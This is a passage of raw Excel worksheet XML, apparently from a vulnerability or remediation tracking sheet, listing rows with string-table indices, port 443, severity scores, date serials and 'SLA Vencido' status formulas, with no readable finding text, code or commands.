      <c r="Z86" s="11"/>
      <c r="AA86" s="8"/>
      <c r="AB86" s="9" t="s">
        <v>2439</v>
      </c>
      <c r="AC86" s="32" t="s">
        <v>1274</v>
      </c>
      <c r="AD86" s="32" t="s">
        <v>2440</v>
      </c>
      <c r="AE86" s="4"/>
      <c r="AF86" s="9"/>
      <c r="AG86" s="27" t="s">
        <v>1179</v>
      </c>
    </row>
    <row r="87" spans="1:33" ht="72.5" x14ac:dyDescent="0.35">
      <c r="A87" s="5">
        <v>86</v>
      </c>
      <c r="B87" s="5" t="s">
        <v>2044</v>
      </c>
      <c r="C87" s="5" t="s">
        <v>33</v>
      </c>
      <c r="D87" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E87" s="4"/>
      <c r="F87" s="4"/>
      <c r="G87" s="6" t="s">
        <v>2103</v>
      </c>
      <c r="H87" s="4" t="s">
        <v>2441</v>
      </c>
      <c r="I87" s="6" t="s">
        <v>2442</v>
      </c>
      <c r="J87" s="4" t="s">
        <v>1042</v>
      </c>
      <c r="K87" s="4"/>
      <c r="L87" s="5" t="s">
        <v>655</v>
      </c>
      <c r="M87" s="5" t="s">
        <v>111</v>
      </c>
      <c r="N87" s="42">
        <v>3.5999999046325684</v>
      </c>
      <c r="O87" s="6"/>
      <c r="P87" s="6"/>
      <c r="Q87" s="6" t="s">
        <v>2107</v>
      </c>
      <c r="R87" s="4"/>
      <c r="S87" s="22"/>
      <c r="T87" s="8">
        <v>45449.859363425923</v>
      </c>
      <c r="U87" s="11">
        <f t="shared" ca="1" si="3"/>
        <v>759.14063657407678</v>
      </c>
      <c r="V87" s="8">
        <f t="shared" si="4"/>
        <v>45569.859363425923</v>
      </c>
      <c r="W87" s="12" t="str">
        <f t="shared" ca="1" si="5"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X87" s="11"/>
      <c r="Y87" s="11"/>
      <c r="Z87" s="11"/>
      <c r="AA87" s="8"/>
      <c r="AB87" s="9" t="s">
        <v>2443</v>
      </c>
      <c r="AC87" s="32" t="s">
        <v>2444</v>
      </c>
      <c r="AD87" s="32" t="s">
        <v>1046</v>
      </c>
      <c r="AE87" s="4"/>
      <c r="AF87" s="9"/>
      <c r="AG87" s="27" t="s">
        <v>1179</v>
      </c>
    </row>
    <row r="88" spans="1:33" ht="290" x14ac:dyDescent="0.35">
      <c r="A88" s="5">
        <v>87</v>
      </c>
      <c r="B88" s="5" t="s">
        <v>2044</v>
      </c>
      <c r="C88" s="5" t="s">
        <v>425</v>
      </c>
      <c r="D88" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E88" s="4"/>
      <c r="F88" s="4"/>
      <c r="G88" s="6" t="s">
        <v>2045</v>
      </c>
      <c r="H88" s="4"/>
      <c r="I88" s="4"/>
      <c r="J88" s="4" t="s">
        <v>2445</v>
      </c>
      <c r="K88" s="4"/>
      <c r="L88" s="5" t="s">
        <v>41</v>
      </c>
      <c r="M88" s="5" t="s">
        <v>2446</v>
      </c>
      <c r="N88" s="4"/>
      <c r="O88" s="6"/>
      <c r="P88" s="4"/>
      <c r="Q88" s="6" t="s">
        <v>2447</v>
      </c>
      <c r="R88" s="4">
        <v>443</v>
      </c>
      <c r="S88" s="22"/>
      <c r="T88" s="8">
        <v>45363</v>
      </c>
      <c r="U88" s="11">
        <f t="shared" ca="1" si="3"/>
        <v>846</v>
      </c>
      <c r="V88" s="8">
        <f t="shared" si="4"/>
        <v>45453</v>
      </c>
      <c r="W88" s="12" t="str">
        <f t="shared" ca="1" si="5"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X88" s="12"/>
      <c r="Y88" s="12"/>
      <c r="Z88" s="12"/>
      <c r="AA88" s="8">
        <v>45678</v>
      </c>
      <c r="AB88" s="9" t="s">
        <v>2448</v>
      </c>
      <c r="AC88" s="32" t="s">
        <v>2449</v>
      </c>
      <c r="AD88" s="43" t="s">
        <v>2450</v>
      </c>
      <c r="AE88" s="4"/>
      <c r="AF88" s="9"/>
      <c r="AG88" s="27" t="s">
        <v>2052</v>
      </c>
    </row>
    <row r="89" spans="1:33" ht="246.5" x14ac:dyDescent="0.35">
      <c r="A89" s="5">
        <v>88</v>
      </c>
      <c r="B89" s="5" t="s">
        <v>2044</v>
      </c>
      <c r="C89" s="5" t="s">
        <v>425</v>
      </c>
      <c r="D89" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E89" s="4"/>
      <c r="F89" s="4"/>
      <c r="G89" s="6" t="s">
        <v>2103</v>
      </c>
      <c r="H89" s="4"/>
      <c r="I89" s="4"/>
      <c r="J89" s="4" t="s">
        <v>2445</v>
      </c>
      <c r="K89" s="4"/>
      <c r="L89" s="5" t="s">
        <v>655</v>
      </c>
      <c r="M89" s="5" t="s">
        <v>2446</v>
      </c>
      <c r="N89" s="4"/>
      <c r="O89" s="6"/>
      <c r="P89" s="4"/>
      <c r="Q89" s="4" t="s">
        <v>2107</v>
      </c>
      <c r="R89" s="4">
        <v>443</v>
      </c>
      <c r="S89" s="22"/>
      <c r="T89" s="8">
        <v>45529</v>
      </c>
      <c r="U89" s="11">
        <f t="shared" ca="1" si="3"/>
        <v>680</v>
      </c>
      <c r="V89" s="8">
        <f t="shared" si="4"/>
        <v>45619</v>
      </c>
      <c r="W89" s="12" t="str">
        <f t="shared" ca="1" si="5"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X89" s="12"/>
      <c r="Y89" s="30"/>
      <c r="Z89" s="30"/>
      <c r="AA89" s="8"/>
      <c r="AB89" s="9" t="s">
        <v>2451</v>
      </c>
      <c r="AC89" s="32" t="s">
        <v>2452</v>
      </c>
      <c r="AD89" s="44" t="s">
        <v>2453</v>
      </c>
      <c r="AE89" s="27"/>
      <c r="AF89" s="9"/>
      <c r="AG89" s="27" t="s">
        <v>1179</v>
      </c>
    </row>
    <row r="90" spans="1:33" ht="87" x14ac:dyDescent="0.35">
      <c r="A90" s="5">
        <v>89</v>
      </c>
      <c r="B90" s="5" t="s">
        <v>2044</v>
      </c>
      <c r="C90" s="5" t="s">
        <v>425</v>
      </c>
      <c r="D90" s="5" t="s">
        <v>371</v>
      </c>
      <c r="E90" s="4"/>
      <c r="F90" s="4"/>
      <c r="G90" s="6" t="s">
        <v>2103</v>
      </c>
      <c r="H90" s="4"/>
      <c r="I90" s="4"/>
      <c r="J90" s="4" t="s">
        <v>2454</v>
      </c>
      <c r="K90" s="4"/>
      <c r="L90" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M90" s="5" t="s">
        <v>2446</v>
      </c>
      <c r="N90" s="4"/>
      <c r="O90" s="14" t="s">
        <v>2455</v>
      </c>
      <c r="P90" s="4"/>
      <c r="Q90" s="4" t="s">
        <v>2107</v>
      </c>
      <c r="R90" s="4">
        <v>443</v>
      </c>
      <c r="S90" s="22"/>
      <c r="T90" s="8">
        <v>45309</v>
      </c>
      <c r="U90" s="11">
        <f t="shared" ca="1" si="3"/>
        <v>900</v>
      </c>
      <c r="V90" s="8">
        <f t="shared" si="4"/>
        <v>45399</v>
      </c>
      <c r="W90" s="12" t="str">
        <f t="shared" ca="1" si="5"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X90" s="12"/>
      <c r="Y90" s="12"/>
      <c r="Z90" s="12"/>
      <c r="AA90" s="8"/>
      <c r="AB90" s="9" t="s">
        <v>2456</v>
      </c>
      <c r="AC90" s="32" t="s">
        <v>2457</v>
      </c>
      <c r="AD90" s="36"/>
      <c r="AE90" s="4"/>
      <c r="AF90" s="9"/>
      <c r="AG90" s="27" t="s">
        <v>1179</v>
      </c>
    </row>
    <row r="91" spans="1:33" ht="261" x14ac:dyDescent="0.35">
      <c r="A91" s="5">
        <v>90</v>
      </c>
      <c r="B91" s="5" t="s">
        <v>2044</v>
      </c>
      <c r="C91" s="5" t="s">
        <v>425</v>
      </c>
      <c r="D91" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E91" s="4"/>
      <c r="F91" s="4"/>
      <c r="G91" s="6" t="s">
        <v>2458</v>
      </c>
      <c r="H91" s="4"/>
      <c r="I91" s="4"/>
      <c r="J91" s="4" t="s">
        <v>2445</v>
      </c>
      <c r="K91" s="4"/>
      <c r="L91" s="5" t="s">
        <v>41</v>
      </c>
      <c r="M91" s="5" t="s">
        <v>2446</v>
      </c>
      <c r="N91" s="4"/>
      <c r="O91" s="6"/>
      <c r="P91" s="6"/>
      <c r="Q91" s="6" t="s">
        <v>2459</v>
      </c>
      <c r="R91" s="4">
        <v>443</v>
      </c>
      <c r="S91" s="22"/>
      <c r="T91" s="8">
        <v>45416</v>
      </c>
      <c r="U91" s="11">
        <f t="shared" ca="1" si="3"/>
        <v>793</v>
      </c>
      <c r="V91" s="8">
        <f t="shared" si="4"/>
        <v>45506</v>
      </c>
      <c r="W91" s="12" t="str">
        <f t="shared" ca="1" si="5"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X91" s="11"/>
      <c r="Y91" s="11"/>
      <c r="Z91" s="11"/>
      <c r="AA91" s="8">
        <v>45678</v>
      </c>
      <c r="AB91" s="9" t="s">
        <v>2460</v>
      </c>
      <c r="AC91" s="32" t="s">
        <v>2449</v>
      </c>
      <c r="AD91" s="43" t="s">
        <v>2461</v>
      </c>
      <c r="AE91" s="4"/>
      <c r="AF91" s="9"/>
      <c r="AG91" s="27" t="s">
        <v>2060</v>
      </c>
    </row>
    <row r="92" spans="1:33" ht="232" x14ac:dyDescent="0.35">
      <c r="A92" s="5">
        <v>91</v>
      </c>
      <c r="B92" s="5" t="s">
        <v>2044</v>
      </c>
      <c r="C92" s="5" t="s">
        <v>425</v>
      </c>
      <c r="D92" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E92" s="4"/>
      <c r="F92" s="4"/>
      <c r="G92" s="6" t="s">
        <v>2458</v>
      </c>
      <c r="H92" s="4"/>
      <c r="I92" s="4"/>
      <c r="J92" s="4" t="s">
        <v>1444</v>
      </c>
      <c r="K92" s="4"/>
      <c r="L92" s="5" t="s">
        <v>41</v>
      </c>
      <c r="M92" s="5" t="s">
        <v>2446</v>
      </c>
      <c r="N92" s="4"/>
      <c r="O92" s="6"/>
      <c r="P92" s="6"/>
      <c r="Q92" s="6" t="s">
        <v>2459</v>
      </c>
      <c r="R92" s="4">
        <v>443</v>
      </c>
      <c r="S92" s="22"/>
      <c r="T92" s="8">
        <v>45416</v>
      </c>
      <c r="U92" s="11">
        <f t="shared" ca="1" si="3"/>
        <v>793</v>
      </c>
      <c r="V92" s="8">
        <f t="shared" si="4"/>
        <v>45506</v>
      </c>
      <c r="W92" s="12" t="str">
        <f t="shared" ca="1" si="5"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X92" s="11"/>
      <c r="Y92" s="11"/>
      <c r="Z92" s="11"/>
      <c r="AA92" s="8">
        <v>45678</v>
      </c>
      <c r="AB92" s="9" t="s">
        <v>2462</v>
      </c>
      <c r="AC92" s="32" t="s">
        <v>1446</v>
      </c>
      <c r="AD92" s="36"/>
      <c r="AE92" s="4"/>
      <c r="AF92" s="9"/>
      <c r="AG92" s="27" t="s">
        <v>2060</v>
      </c>
    </row>
    <row r="93" spans="1:33" ht="203" x14ac:dyDescent="0.35">
      <c r="A93" s="5">
        <v>92</v>
      </c>
      <c r="B93" s="5" t="s">
        <v>2044</v>
      </c>
      <c r="C93" s="5" t="s">
        <v>425</v>
      </c>
      <c r="D93" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E93" s="4"/>
      <c r="F93" s="4"/>
      <c r="G93" s="6" t="s">
        <v>2458</v>
      </c>
      <c r="H93" s="4"/>
      <c r="I93" s="4"/>
      <c r="J93" s="4" t="s">
        <v>2463</v>
      </c>
      <c r="K93" s="4"/>
      <c r="L93" s="5" t="s">
        <v>41</v>
      </c>
      <c r="M93" s="5" t="s">
        <v>2446</v>
      </c>
      <c r="N93" s="5"/>
      <c r="O93" s="6"/>
      <c r="P93" s="6"/>
      <c r="Q93" s="6" t="s">
        <v>2459</v>
      </c>
      <c r="R93" s="4"/>
      <c r="S93" s="22"/>
      <c r="T93" s="8">
        <v>45419</v>
      </c>
      <c r="U93" s="11">
        <f t="shared" ca="1" si="3"/>
        <v>790</v>
      </c>
      <c r="V93" s="8">
        <f t="shared" si="4"/>
        <v>45509</v>
      </c>
      <c r="W93" s="12" t="str">
        <f t="shared" ca="1" si="5"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X93" s="11"/>
      <c r="Y93" s="11"/>
      <c r="Z93" s="11"/>
      <c r="AA93" s="8">
        <v>45678</v>
      </c>
      <c r="AB93" s="9" t="s">
        <v>2464</v>
      </c>
      <c r="AC93" s="32" t="s">
        <v>2465</v>
      </c>
      <c r="AD93" s="32"/>
      <c r="AE93" s="9"/>
      <c r="AF93" s="9"/>
      <c r="AG93" s="27" t="s">
        <v>2060</v>
      </c>
    </row>
    <row r="94" spans="1:33" ht="275.5" x14ac:dyDescent="0.35">
      <c r="A94" s="5">
        <v>93</v>
      </c>
      <c r="B94" s="5" t="s">
        <v>2044</v>
      </c>
      <c r="C94" s="5" t="s">
        <v>425</v>
      </c>
      <c r="D94" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E94" s="4"/>
      <c r="F94" s="4"/>
      <c r="G94" s="6" t="s">
        <v>2103</v>
      </c>
      <c r="H94" s="4"/>
      <c r="I94" s="4"/>
      <c r="J94" s="9" t="s">
        <v>2466</v>
      </c>
      <c r="K94" s="4"/>
      <c r="L94" s="5" t="s">
        <v>655</v>
      </c>
      <c r="M94" s="5" t="s">
        <v>427</v>
      </c>
      <c r="N94" s="5"/>
      <c r="O94" s="6"/>
      <c r="P94" s="6"/>
      <c r="Q94" s="4" t="s">
        <v>2107</v>
      </c>
      <c r="R94" s="4">
        <v>443</v>
      </c>
      <c r="S94" s="22"/>
      <c r="T94" s="8">
        <v>45407</v>
      </c>
      <c r="U94" s="11">
        <f t="shared" ca="1" si="3"/>
        <v>802</v>
      </c>
      <c r="V94" s="8">
        <f t="shared" si="4"/>
        <v>45527</v>
      </c>
      <c r="W94" s="12" t="str">
        <f t="shared" ca="1" si="5"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X94" s="11"/>
      <c r="Y94" s="11"/>
      <c r="Z94" s="11"/>
      <c r="AA94" s="8"/>
      <c r="AB94" s="9" t="s">
        <v>2467</v>
      </c>
      <c r="AC94" s="9" t="s">
        <v>2468</v>
      </c>
      <c r="AD94" s="32"/>
      <c r="AE94" s="9"/>
      <c r="AF94" s="9"/>
      <c r="AG94" s="27" t="s">
        <v>1179</v>
      </c>
    </row>
    <row r="95" spans="1:33" ht="261" x14ac:dyDescent="0.35">
      <c r="A95" s="5">
        <v>94</v>
      </c>
      <c r="B95" s="5" t="s">
        <v>2044</v>
      </c>
      <c r="C95" s="5" t="s">
        <v>425</v>
      </c>
      <c r="D95" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E95" s="4"/>
      <c r="F95" s="4"/>
      <c r="G95" s="6" t="s">
        <v>2458</v>
      </c>
      <c r="H95" s="4"/>
      <c r="I95" s="4"/>
      <c r="J95" s="4" t="s">
        <v>2469</v>
      </c>
      <c r="K95" s="4"/>
      <c r="L95" s="5" t="s">
        <v>41</v>
      </c>
      <c r="M95" s="5" t="s">
        <v>427</v>
      </c>
      <c r="N95" s="5"/>
      <c r="O95" s="6"/>
      <c r="P95" s="6"/>
      <c r="Q95" s="6" t="s">
        <v>2459</v>
      </c>
      <c r="R95" s="4">
        <v>443</v>
      </c>
      <c r="S95" s="22"/>
      <c r="T95" s="8">
        <v>45416</v>
      </c>
      <c r="U95" s="11">
        <f t="shared" ca="1" si="3"/>
        <v>793</v>
      </c>
      <c r="V95" s="8">
        <f t="shared" si="4"/>
        <v>45536</v>
      </c>
      <c r="W95" s="12" t="str">
        <f t="shared" ca="1" si="5"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X95" s="11"/>
      <c r="Y95" s="11"/>
      <c r="Z95" s="11"/>
      <c r="AA95" s="8">
        <v>45678</v>
      </c>
      <c r="AB95" s="9" t="s">
        <v>2470</v>
      </c>
      <c r="AC95" s="32" t="s">
        <v>2471</v>
      </c>
      <c r="AD95" s="32"/>
      <c r="AE95" s="8"/>
      <c r="AF95" s="27"/>
      <c r="AG95" s="27" t="s">
        <v>2060</v>
      </c>
    </row>
    <row r="96" spans="1:33" ht="261" x14ac:dyDescent="0.35">
      <c r="A96" s="5">
        <v>95</v>
      </c>
      <c r="B96" s="5" t="s">
        <v>2044</v>
      </c>
      <c r="C96" s="5" t="s">
        <v>425</v>
      </c>
      <c r="D96" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E96" s="4"/>
      <c r="F96" s="4"/>
      <c r="G96" s="6" t="s">
        <v>2458</v>
      </c>
      <c r="H96" s="9"/>
      <c r="I96" s="9"/>
      <c r="J96" s="9" t="s">
        <v>2466</v>
      </c>
      <c r="K96" s="4"/>
      <c r="L96" s="5" t="s">
        <v>41</v>
      </c>
      <c r="M96" s="5" t="s">
        <v>427</v>
      </c>
      <c r="N96" s="5"/>
      <c r="O96" s="14"/>
      <c r="P96" s="6"/>
      <c r="Q96" s="6" t="s">
        <v>2459</v>
      </c>
      <c r="R96" s="4">
        <v>443</v>
      </c>
      <c r="S96" s="22"/>
      <c r="T96" s="8">
        <v>45468</v>
      </c>
      <c r="U96" s="11">
        <f t="shared" ca="1" si="3"/>
        <v>741</v>
      </c>
      <c r="V96" s="8">
        <f t="shared" si="4"/>
        <v>45588</v>
      </c>
      <c r="W96" s="12" t="str">
        <f t="shared" ca="1" si="5"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X96" s="12"/>
      <c r="Y96" s="30"/>
      <c r="Z96" s="30"/>
      <c r="AA96" s="8">
        <v>45678</v>
      </c>
      <c r="AB96" s="9" t="s">
        <v>2472</v>
      </c>
      <c r="AC96" s="32" t="s">
        <v>2473</v>
      </c>
      <c r="AD96" s="32"/>
      <c r="AE96" s="27"/>
      <c r="AF96" s="9"/>
      <c r="AG96" s="27" t="s">
        <v>2060</v>
      </c>
    </row>
    <row r="97" spans="1:33" ht="145" x14ac:dyDescent="0.35">
      <c r="A97" s="5">
        <v>96</v>
      </c>
      <c r="B97" s="21" t="s">
        <v>2044</v>
      </c>
      <c r="C97" s="5" t="s">
        <v>630</v>
      </c>
      <c r="D97" s="5" t="s">
        <v>371</v>
      </c>
      <c r="E97" s="4"/>
      <c r="F97" s="4"/>
      <c r="G97" s="6" t="s">
        <v>2474</v>
      </c>
      <c r="H97" s="4"/>
      <c r="I97" s="4"/>
      <c r="J97" s="4" t="s">
        <v>2475</v>
      </c>
      <c r="K97" s="4"/>
      <c r="L97" s="5" t="s">
        <v>655</v>
      </c>
      <c r="M97" s="5" t="s">
        <v>522</v>
      </c>
      <c r="N97" s="5"/>
      <c r="O97" s="6"/>
      <c r="P97" s="6"/>
      <c r="Q97" s="4" t="s">
        <v>2476</v>
      </c>
      <c r="R97" s="4">
        <v>443</v>
      </c>
      <c r="S97" s="22"/>
      <c r="T97" s="8">
        <v>45509</v>
      </c>
      <c r="U97" s="11">
        <f t="shared" ca="1" si="3"/>
        <v>700</v>
      </c>
      <c r="V97" s="8">
        <f t="shared" si="4"/>
        <v>45539</v>
      </c>
      <c r="W97" s="12" t="str">
        <f t="shared" ca="1" si="5"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X97" s="11"/>
      <c r="Y97" s="11"/>
      <c r="Z97" s="11"/>
      <c r="AA97" s="8"/>
      <c r="AB97" s="9" t="s">
        <v>2477</v>
      </c>
      <c r="AC97" s="32" t="s">
        <v>2478</v>
      </c>
      <c r="AD97" s="32" t="s">
        <v>2479</v>
      </c>
      <c r="AE97" s="27"/>
      <c r="AF97" s="9"/>
      <c r="AG97" s="27" t="s">
        <v>1823</v>
      </c>
    </row>
    <row r="98" spans="1:33" ht="203" x14ac:dyDescent="0.35">
      <c r="A98" s="5">
        <v>97</v>
      </c>
      <c r="B98" s="21" t="s">
        <v>2044</v>
      </c>
      <c r="C98" s="5" t="s">
        <v>33</v>
      </c>
      <c r="D98" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E98" s="4"/>
      <c r="F98" s="4"/>
      <c r="G98" s="6" t="s">
        <v>2053</v>
      </c>
      <c r="H98" s="4" t="s">
        <v>2480</v>
      </c>
      <c r="I98" s="6" t="s">
        <v>2481</v>
      </c>
      <c r="J98" s="4" t="s">
        <v>2482</v>
      </c>
      <c r="K98" s="4"/>
      <c r="L98" s="5" t="s">
        <v>655</v>
      </c>
      <c r="M98" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N98" s="5">
        <v>5.0999999999999996</v>
      </c>
      <c r="O98" s="6"/>
      <c r="P98" s="6"/>
      <c r="Q98" s="4" t="s">
        <v>2092</v>
      </c>
      <c r="R98" s="4"/>
      <c r="S98" s="22"/>
      <c r="T98" s="8">
        <v>45586</v>
      </c>
      <c r="U98" s="11">
        <f t="shared" ca="1" si="3"/>
        <v>623</v>
      </c>
      <c r="V98" s="8">
        <f t="shared" si="4"/>
        <v>45676</v>
      </c>
      <c r="W98" s="12" t="str">
        <f t="shared" ca="1" si="5"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X98" s="11"/>
      <c r="Y98" s="11"/>
      <c r="Z98" s="11"/>
      <c r="AA98" s="8"/>
      <c r="AB98" s="9" t="s">
        <v>2483</v>
      </c>
      <c r="AC98" s="32" t="s">
        <v>2484</v>
      </c>
      <c r="AD98" s="32" t="s">
        <v>2485</v>
      </c>
      <c r="AE98" s="70" t="s">
        <v>2486</v>
      </c>
      <c r="AF98" s="65" t="s">
        <v>2095</v>
      </c>
      <c r="AG98" s="27" t="s">
        <v>1823</v>
      </c>
    </row>
    <row r="99" spans="1:33" ht="130.5" x14ac:dyDescent="0.35">
      <c r="A99" s="5">
        <v>98</v>
      </c>
      <c r="B99" s="21" t="s">
        <v>2044</v>
      </c>
      <c r="C99" s="5" t="s">
        <v>33</v>
      </c>
      <c r="D99" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E99" s="4"/>
      <c r="F99" s="4"/>
      <c r="G99" s="6" t="s">
        <v>2053</v>
      </c>
      <c r="H99" s="4" t="s">
        <v>2487</v>
      </c>
      <c r="I99" s="6" t="s">
        <v>2488</v>
      </c>
      <c r="J99" s="4" t="s">
        <v>421</v>
      </c>
      <c r="K99" s="4"/>
      <c r="L99" s="5" t="s">
        <v>655</v>
      </c>
      <c r="M99" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N99" s="5">
        <v>5.0999999999999996</v>
      </c>
      <c r="O99" s="6"/>
      <c r="P99" s="6"/>
      <c r="Q99" s="4" t="s">
        <v>2092</v>
      </c>
      <c r="R99" s="4"/>
      <c r="S99" s="22"/>
      <c r="T99" s="8">
        <v>45586</v>
      </c>
      <c r="U99" s="11">
        <f t="shared" ca="1" si="3"/>
        <v>623</v>
      </c>
      <c r="V99" s="8">
        <f t="shared" si="4"/>
        <v>45676</v>
      </c>
      <c r="W99" s="12" t="str">
        <f t="shared" ca="1" si="5"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X99" s="11"/>
      <c r="Y99" s="11"/>
      <c r="Z99" s="11"/>
      <c r="AA99" s="8"/>
      <c r="AB99" s="32" t="s">
        <v>2489</v>
      </c>
      <c r="AC99" s="9" t="s">
        <v>2490</v>
      </c>
      <c r="AD99" s="32" t="s">
        <v>2491</v>
      </c>
      <c r="AE99" s="70" t="s">
        <v>2492</v>
      </c>
      <c r="AF99" s="65" t="s">
        <v>2095</v>
      </c>
      <c r="AG99" s="27" t="s">
        <v>1823</v>
      </c>
    </row>
    <row r="100" spans="1:33" ht="290" x14ac:dyDescent="0.35">
      <c r="A100" s="5">
        <v>99</v>
      </c>
      <c r="B100" s="21" t="s">
        <v>2044</v>
      </c>
      <c r="C100" s="5" t="s">
        <v>33</v>
      </c>
      <c r="D100" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E100" s="4"/>
      <c r="F100" s="4"/>
      <c r="G100" s="6" t="s">
        <v>2103</v>
      </c>
      <c r="H100" s="4" t="s">
        <v>2493</v>
      </c>
      <c r="I100" s="6" t="s">
        <v>2494</v>
      </c>
      <c r="J100" s="4" t="s">
        <v>2495</v>
      </c>
      <c r="K100" s="4"/>
      <c r="L100" s="5" t="s">
        <v>655</v>
      </c>
      <c r="M100" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N100" s="5">
        <v>5.3</v>
      </c>
      <c r="O100" s="6"/>
      <c r="P100" s="6"/>
      <c r="Q100" s="4" t="s">
        <v>2107</v>
      </c>
      <c r="R100" s="4">
        <v>443</v>
      </c>
      <c r="S100" s="22"/>
      <c r="T100" s="8">
        <v>45601</v>
      </c>
      <c r="U100" s="11">
        <f t="shared" ca="1" si="3"/>
        <v>608</v>
      </c>
      <c r="V100" s="8">
        <f t="shared" si="4"/>
        <v>45691</v>
      </c>
      <c r="W100" s="12" t="str">
        <f t="shared" ca="1" si="5"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X100" s="11"/>
      <c r="Y100" s="11"/>
      <c r="Z100" s="11"/>
      <c r="AA100" s="8"/>
      <c r="AB100" s="9" t="s">
        <v>2496</v>
      </c>
      <c r="AC100" s="9" t="s">
        <v>2497</v>
      </c>
      <c r="AD100" s="32" t="s">
        <v>2498</v>
      </c>
      <c r="AE100" s="27"/>
      <c r="AF100" s="9"/>
      <c r="AG100" s="27" t="s">
        <v>1179</v>
      </c>
    </row>
    <row r="101" spans="1:33" ht="87" x14ac:dyDescent="0.35">
      <c r="A101" s="5">
        <v>100</v>
      </c>
      <c r="B101" s="21" t="s">
        <v>2044</v>
      </c>
      <c r="C101" s="5" t="s">
        <v>33</v>
      </c>
      <c r="D101" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E101" s="4"/>
      <c r="F101" s="4"/>
      <c r="G101" s="6" t="s">
        <v>2103</v>
      </c>
      <c r="H101" s="9" t="s">
        <v>2499</v>
      </c>
      <c r="I101" s="6" t="s">
        <v>2500</v>
      </c>
      <c r="J101" s="4" t="s">
        <v>2501</v>
      </c>
      <c r="K101" s="4"/>
      <c r="L101" s="5" t="s">
        <v>655</v>
      </c>
      <c r="M101" s="5" t="s">
        <v>111</v>
      </c>
      <c r="N101" s="5">
        <v>4.3</v>
      </c>
      <c r="O101" s="6"/>
      <c r="P101" s="6"/>
      <c r="Q101" s="4" t="s">
        <v>2107</v>
      </c>
      <c r="R101" s="4">
        <v>443</v>
      </c>
      <c r="S101" s="22"/>
      <c r="T101" s="8">
        <v>45601</v>
      </c>
      <c r="U101" s="11">
        <f t="shared" ca="1" si="3"/>
        <v>608</v>
      </c>
      <c r="V101" s="8">
        <f t="shared" si="4"/>
        <v>45721</v>
      </c>
      <c r="W101" s="12" t="str">
        <f t="shared" ca="1" si="5"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X101" s="11"/>
      <c r="Y101" s="11"/>
      <c r="Z101" s="11"/>
      <c r="AA101" s="8"/>
      <c r="AB101" s="9" t="s">
        <v>2502</v>
      </c>
      <c r="AC101" s="9" t="s">
        <v>2503</v>
      </c>
      <c r="AD101" s="32" t="s">
        <v>2504</v>
      </c>
      <c r="AE101" s="27"/>
      <c r="AF101" s="9"/>
      <c r="AG101" s="27" t="s">
        <v>1179</v>
      </c>
    </row>
    <row r="102" spans="1:33" ht="174" x14ac:dyDescent="0.35">
      <c r="A102" s="5">
        <v>101</v>
      </c>
      <c r="B102" s="21" t="s">
        <v>2044</v>
      </c>
      <c r="C102" s="5" t="s">
        <v>33</v>
      </c>
      <c r="D102" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E102" s="4"/>
      <c r="F102" s="4"/>
      <c r="G102" s="6" t="s">
        <v>2061</v>
      </c>
      <c r="H102" s="9" t="s">
        <v>2505</v>
      </c>
      <c r="I102" s="6" t="s">
        <v>2506</v>
      </c>
      <c r="J102" s="4" t="s">
        <v>80</v>
      </c>
      <c r="K102" s="4"/>
      <c r="L102" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M102" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N102" s="5">
        <v>4.4000000000000004</v>
      </c>
      <c r="O102" s="14" t="s">
        <v>2507</v>
      </c>
      <c r="P102" s="6"/>
      <c r="Q102" s="4" t="s">
        <v>2077</v>
      </c>
      <c r="R102" s="4"/>
      <c r="S102" s="22"/>
      <c r="T102" s="8">
        <v>45615</v>
      </c>
      <c r="U102" s="11">
        <f t="shared" ca="1" si="3"/>
        <v>594</v>
      </c>
      <c r="V102" s="8">
        <f t="shared" si="4"/>
        <v>45705</v>
      </c>
      <c r="W102" s="12" t="str">
        <f t="shared" ca="1" si="5"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X102" s="11"/>
      <c r="Y102" s="11"/>
      <c r="Z102" s="11"/>
      <c r="AA102" s="8"/>
      <c r="AB102" s="9" t="s">
        <v>2508</v>
      </c>
      <c r="AC102" s="9" t="s">
        <v>1713</v>
      </c>
      <c r="AD102" s="32" t="s">
        <v>2509</v>
      </c>
      <c r="AE102" s="70" t="s">
        <v>2080</v>
      </c>
      <c r="AF102" s="9"/>
      <c r="AG102" s="27" t="s">
        <v>1823</v>
      </c>
    </row>
    <row r="103" spans="1:33" ht="174" x14ac:dyDescent="0.35">
      <c r="A103" s="5">
        <v>102</v>
      </c>
      <c r="B103" s="21" t="s">
        <v>2044</v>
      </c>
      <c r="C103" s="5" t="s">
        <v>33</v>
      </c>
      <c r="D103" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E103" s="4"/>
      <c r="F103" s="4"/>
      <c r="G103" s="6" t="s">
        <v>2239</v>
      </c>
      <c r="H103" s="9" t="s">
        <v>2510</v>
      </c>
      <c r="I103" s="6" t="s">
        <v>2511</v>
      </c>
